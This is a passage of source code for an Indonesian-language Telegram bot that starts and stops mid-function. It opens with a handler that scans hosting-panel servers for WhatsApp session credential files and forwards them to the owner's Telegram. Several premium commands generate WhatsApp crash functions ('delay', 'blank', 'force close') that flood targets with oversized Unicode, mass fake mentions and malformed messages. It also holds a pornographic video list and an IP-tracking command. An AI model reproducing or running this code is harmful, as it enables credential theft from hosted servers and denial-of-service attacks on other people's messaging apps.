      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("gpt", async (ctx) => {
  const chatId = ctx.chat.id;

  // ambil query setelah /gpt
  const query = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!query) {
    return ctx.reply(
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await ctx.reply("⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return ctx.reply(
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return ctx.reply("⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    return ctx.reply(`❌ Error: ${err.message}`);
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|xavionerAmpazz",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});
bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]

bot.command('web2apk', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 3) {
    return ctx.reply("Reply Icon Web : `/web2apk <url> <namaApp> <email>`", { parse_mode: 'Markdown' });
  }
  if (!ctx.message.reply_to_message?.photo) {
    return ctx.reply('Kamu harus reply foto dulu untuk dijadikan ikon APK!', { parse_mode: 'Markdown' });
  }

  const [url, appName, email] = args;
  try { new URL(url); } catch { return ctx.reply('URL tidak valid'); }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return ctx.reply('Email tidak valid');

  const waitMsg = await ctx.reply('Upload & build APK dimulai… (perkiraan memakan waktu 3-8 menit)', { parse_mode: 'Markdown' });

  (async () => {                       
    try {
      const photo = ctx.message.reply_to_message.photo.pop();
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      const { data: buffer } = await axios.get(fileLink.href, { responseType: 'arraybuffer' });

      const form = new FormData();
      form.append('files', buffer, { filename: 'icon.png', contentType: 'image/png' });

      const up = await axios.post('https://cdn.yupra.my.id/upload', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!up.data?.success || !up.data.files?.[0]) throw new Error('CDN gagal');
      const iconUrl = 'https://cdn.yupra.my.id' + up.data.files[0].url;

      const buildUrl =
        'https://api.fikmydomainsz.xyz/tools/toapp/build-complete' +
        '?url=' + encodeURIComponent(url) +
        '&email=' + encodeURIComponent(email) +
        '&appName=' + encodeURIComponent(appName) +
        '&appIcon=' + encodeURIComponent(iconUrl);

      const { data: job } = await axios.get(buildUrl, { timeout: 0 });
      if (!job.status) throw new Error(job.error || 'Build gagal');

      const caption =
        `Aplikasi berhasil dibuat!\n\n` +
        `Nama: ${appName}\n` +
        `Download APK: ${job.downloadUrl}`;

      await ctx.telegram.sendMessage(ctx.chat.id, caption, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    } catch (err) {
      await ctx.telegram.sendMessage(ctx.chat.id, `${err.message || 'Terjadi kesalahan'}`, {
        parse_mode: 'Markdown'
      });
      console.error('[X]', err);
    }
  })();

  return;
});

bot.command("pair", async (ctx) => {
    try {
        const chatId = ctx.chat.id;

        // Ambil admin grup
        const members = await ctx.telegram.getChatAdministrators(chatId);

        // Ambil nama depan admin
        const names = members
            .map(m => m.user.first_name)
            .filter(Boolean);

        if (names.length < 2) {
            return ctx.reply("Admin kurang buat dipasangin 😹");
        }

        const a = names[Math.floor(Math.random() * names.length)];
        const b = names[Math.floor(Math.random() * names.length)];

        await ctx.reply(`💞 Pasangan hari ini: ${a} ❤️ ${b}`);
    } catch (err) {
        console.error("PAIR ERROR:", err);
        ctx.reply("Gagal ngambil data admin.");
    }
});

bot.command('xnxx', checkPremium, async (ctx) => {
  // Kirim pesan loading
  const loadingMsg = await ctx.reply('🔄 Loading video... Tunggu sebentar!');
  
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  const pick = getRandomVideo();
  
  try {
    // Gunakan approach direct URL tanpa download
    await ctx.replyWithVideo(pick.url, {  // Langsung pass URL string, bukan object
      caption: '🎬 Video special untuk kamu!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    // Hapus pesan loading
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim video. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('video_next', async (ctx) => {
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  
  try {
    await ctx.answerCbQuery();
    
    // Kirim loading untuk next
    const loadingMsg = await ctx.reply('🔄 Loading video berikutnya...');
    
    await ctx.deleteMessage(); // Delete message lama
    
    const pick = getRandomVideo();
    await ctx.replyWithVideo(pick.url, {  // Direct URL
      caption: '🎬 Video berikutnya!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading video', { show_alert: true });
  }
});
// ======================= STICKER → URL =====================
bot.command('getfuncdelay', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /createfunc [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(target, ${namafunc}) {
  const ${namafunc}dellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\\u0003".repeat(92000),
    rows: [{ title: \`\${r + 1}\`, id: \`\${r + 1}\` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\\u0003",
          listType: 2,
          buttonText: null,
          sections: ${namafunc},
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };

  const MassageFolware = {
    extendedTextMessage: {
      text: "\\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\\u0003".repeat(500),
      title: "\\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\\u0003",
          body: "\\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => \`\${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net\`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\\u0003".repeat(1770),
      serviceType: 1,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});
  await ${type}.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await ${type}.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ ${namafunc} Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

[ FUNC TYPE DELAY ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});

bot.command('getfuncblank', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /getfuncblank [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(target, Ptcp = true) {
  let pesan = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦾ࣯࣯ Blank By ${namafunc}" + "\u0000".repeat(1000000),
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "null",
                header: "I'm The King Of ${namafunc}",
                body: "👀",
              }),
              buttons: [],
            },
            contextInfo: {
              mentionedJid: [target],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
            },
          },
        },
      },
    },
    { quoted: Qcrl }
  );

  await ${type}.relayMessage(
    target,
    pesan.message,
    Ptcp ? { participant: { jid: target, messageId: pesan.key.id } } : {}
  );
  console.log(chalk.blue(" success send bug "));
}

[ FUNC TYPE BLANK ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});
bot.command('getfuncfc', checkPremium, async (ctx) => {
    const id = ctx.from.id;

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 2) return ctx.reply('⚠️ Format: /getfuncfc [namafunc] [type]');

    const namafunc = args[0];
    const type = args[1];

    const funcCode =
        `async function ${namafunc}(${type}, target) {
  try {
    const force = Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 5000) + "@s.whatsapp.net"
    );

    const vc = {
      callMessage: {
        isVideo: true,
        duration: 999999,
        callOutcome: 'missed',
        caption: '${namafunc}'.repeat(1000)
      }
    };
    
    const paymentNode = {
            tag: "payment",
            attrs: {
                id: "PAY-" + Date.now(),
                amount: "9999999999",
                currency: "IDR",
                type: "request"
            }
        };
    
    const bundle = {
      ...force,
      ...vc,
      ...paymentNode
    };

    const out = generateWAMessageFromContent(target, bundle, { userJid: sock.user.id });
    await ${type}.relayMessage(target, out.message, { messageId: out.key.id });
    return true;
  } catch (e) {
    console.error('${namafunc} err:', e);
    return false;
  }
};

[ FUNC TYPE FORCE CLOSE ]`;

    try {
        await ctx.reply('```js\n' + funcCode + '\n```', {
            parse_mode: 'Markdown'
        });
    } catch (e) {
        await ctx.reply('⚠️ Gagal mengirim kode fungsi: ' + e.message);
    }
});
bot.command("cekwa", checkWhatsAppConnection, async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("Format:\n/cekwa 628xxxx");
    }

    const result = await ultraRealChecker(sock, args[1]);

    const msg = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝗩𝗶𝗽𝗲𝗿 𝗜𝗻𝘃𝗶𝗰𝘁𝘂𝘀 ⎭ ⊰―—═⬡</pre></blockquote>

⌬ Status      : ${result.status}
⌬ Banned      : ${result.banned}
⌬ Business    : ${result.business}
⌬ Meta Verify : ${result.verified}
⌬ Privacy     : ${result.privacy || "-"}
⌬ Info        : ${result.note}

<blockquote><pre>⚡ @sennsofhopee</pre></blockquote>
`;

    ctx.reply(msg, { parse_mode: "HTML" });
});
bot.command('cekidchannel', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);

    if (!args[0]) {
      return ctx.reply(
        '❌ Masukkan link channel!\n\nContoh:\n/cekidchannel https://whatsapp.com/channel/xxxx'
      );
    }

    const link = args[0].trim();

    if (!link.includes('whatsapp.com/channel/')) {
      return ctx.reply('❌ Link tidak valid!');
    }

    // Ambil kode unik dari link
    const inviteCode = link.split('channel/')[1];

    if (!inviteCode) {
      return ctx.reply('❌ Tidak bisa membaca kode channel!');
    }

    // Ambil metadata dari WA (Baileys)
    const metadata = await conn.newsletterMetadata(inviteCode);

    const channelId = metadata.id;

    await ctx.replyWithMarkdown(
`✅ *CHANNEL DITEMUKAN*

📌 *Nama:* ${metadata.name}
🆔 *ID:* \`${channelId}\`
👥 *Pengikut:* ${metadata.subscribers || 0}

━━━━━━━━━━━━━━━━━━
⚡ Viper Invictus`
    );

  } catch (err) {
    console.log(err);
    ctx.reply('❌ Gagal mengambil data channel.\nPastikan link valid & bot support newsletter.');
  }
});
bot.command('cekfunc', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply || !reply.text) {
    return ctx.reply('⚠️ Balas kode yang mau dicek dulu!');
  }

  const code = reply.text;
  const lines = code.split('\n');

  try {
    new vm.Script(code);

    return ctx.replyWithHTML(
`✅ <b>KODE VALID</b>
━━━━━━━━━━━━━━━━━━
Tidak ditemukan syntax error.`
    );

  } catch (err) {
    const errorMsg = err.message;

    const match = errorMsg.match(/:(\d+):(\d+)/);
    const lineNumber = match ? parseInt(match[1]) : null;
    const columnNumber = match ? parseInt(match[2]) : null;

    let snippet = "Tidak bisa mendeteksi baris.";

    if (lineNumber && lines[lineNumber - 1]) {
      const start = Math.max(0, lineNumber - 2);   // 1 baris sebelum
      const end = Math.min(lines.length, lineNumber + 1); // 1 baris sesudah

      let context = "";

      for (let i = start; i < end; i++) {
        const line = escapeHTML(lines[i]);
        const lineIndex = i + 1;

        if (lineIndex === lineNumber) {
          context += `➜ ${lineIndex}. ${line}\n`;

          if (columnNumber) {
            context += "   " + " ".repeat(columnNumber - 1) + "↑\n";
          }
        } else {
          context += `  ${lineIndex}. ${line}\n`;
        }
      }

      snippet = `<code>${context}</code>`;
    }

    return ctx.replyWithHTML(
`❌ <b>KODE ERROR</b>
━━━━━━━━━━━━━━━━━━
<b>Pesan:</b>
<code>${escapeHTML(errorMsg)}</code>
`
    );
  }
});

bot.command("cektele", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Format: /cektele <id>");

  try {
    const chat = await ctx.telegram.getChat(input);

    ctx.reply(`
📡 STATUS TELEGRAM

🆔 ID: ${chat.id}
👤 Username: ${chat.username ? "@" + chat.username : "Tidak ada"}
📛 Nama: ${chat.first_name || "-"}
📂 Type: ${chat.type}
    `);

  } catch (err) {
    ctx.reply("❌ User tidak ditemukan atau bot tidak punya akses.");
  }
});

bot.command("tofunc", async (ctx) => {
  const chatId = ctx.chat.id;

  const repliedMsg = ctx.message.reply_to_message;
  if (!repliedMsg) {
    return ctx.reply(
      "❌ Reply pesan yang berisi media!",
      { reply_to_message_id: ctx.message.message_id }
    );
  }

  try {
    let fileId, whatsappType;
    const mediaTypes = ["photo", "video", "document", "audio", "sticker"];

    if (!mediaTypes.some(type => repliedMsg[type])) {
      return ctx.reply(
        "❌ Pesan yang dibalas tidak mengandung media!",
        { reply_to_message_id: ctx.message.message_id }
      );
    }

    if (repliedMsg.photo) {
      fileId = repliedMsg.photo.at(-1).file_id;
      whatsappType = "image";
    } else if (repliedMsg.video) {
      fileId = repliedMsg.video.file_id;
      whatsappType = "video";
    } else if (repliedMsg.document) {
      fileId = repliedMsg.document.file_id;
      whatsappType = "document";
    } else if (repliedMsg.audio) {
      fileId = repliedMsg.audio.file_id;
      whatsappType = repliedMsg.audio.mime_type?.startsWith("audio/ogg")
        ? "ptt"
        : "audio";
    } else if (repliedMsg.sticker) {
      fileId = repliedMsg.sticker.file_id;
      whatsappType = "sticker";
    }

    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    let mime = "application/octet-stream";
    if (repliedMsg.document?.mime_type) mime = repliedMsg.document.mime_type;
    if (repliedMsg.video?.mime_type) mime = repliedMsg.video.mime_type;
    if (repliedMsg.audio?.mime_type) mime = repliedMsg.audio.mime_type;
    if (whatsappType === "sticker") {
      mime = repliedMsg.sticker.is_animated
        ? "application/x-tgs"
        : "image/webp";
    }

    const sentMsg = await sock.sendMessage(sock.user.id, {
      [whatsappType]: {
        url: fileUrl,
        mimetype: mime,
      },
    });

    if (!sentMsg?.message) {
      throw new Error("Failed to send media - no response from WhatsApp");
    }

    const messageType = Object.keys(sentMsg.message)[0];
    const media = sentMsg.message[messageType];

    await ctx.reply(
      `\`\`\`js
type: "${messageType}",
url: "${media.url || null}",
directPath: "${media.directPath || null}",
mimetype: "${media.mimetype || null}",
mediaKey: "${media.mediaKey?.toString("base64") || null}",
fileEncSha256: "${media.fileEncSha256?.toString("base64") || null}",
fileSha256: "${media.fileSha256?.toString("base64") || null}",
fileLength: "${media.fileLength || null}",
mediaKeyTimestamp: "${media.mediaKeyTimestamp || null}"
@sennsofhopee
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_to_message_id: ctx.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "「 𝐎𝐰𝐧𝐞𝐫 」",
                url: "https://t.me/sennsofhopee",
              },
            ],
          ],
        },
      }
    );

  } catch (err) {
    console.error("Error in /tofunc:", err);

    let errorMsg = "❌ Gagal mengirim media.";
    if (err.message.includes("not connected")) {
      errorMsg = "❌ WhatsApp session not connected!";
    } else if (err.message.includes("ENOENT")) {
      errorMsg = "❌ File not found on Telegram servers!";
    } else {
      errorMsg += ` Error: ${err.message}`;
    }

    await ctx.reply(errorMsg, {
      reply_to_message_id: ctx.message.message_id,
    });
  }
});
bot.command("tebakangka", (ctx) => {
    const botNumber = Math.floor(Math.random() * 10) + 1;
    const userGuess = parseInt(ctx.message.text.split(" ")[1]);

    if (!userGuess)
        return ctx.reply("Contoh: /tebakangka 7");

    if (userGuess === botNumber) {
        ctx.reply(`🎉 Benar! Angkanya ${botNumber}`);
    } else {
        ctx.reply(`❌ Salah! Angka yang benar ${botNumber}`);
    }
});
bot.command("sultan", (ctx) => {
    const persen = Math.floor(Math.random() * 101);
    ctx.reply(`👑 Aura kesultanan kamu: ${persen}%`);
});
bot.command("toxic", (ctx) => {
    const persen = Math.floor(Math.random() * 101);
    ctx.reply(`☣️ Tingkat toxic kamu: ${persen}%`);
});
bot.command("bomtag", async (ctx) => {
    if (ctx.chat.type === "private") 
        return ctx.reply("Gunakan di grup.");

    const member = ctx.from.first_name;
    ctx.reply(`💣 BOOM! ${member} kena bom fun!`);
});
bot.command("iq", (ctx) => {
    const target = ctx.message.reply_to_message;
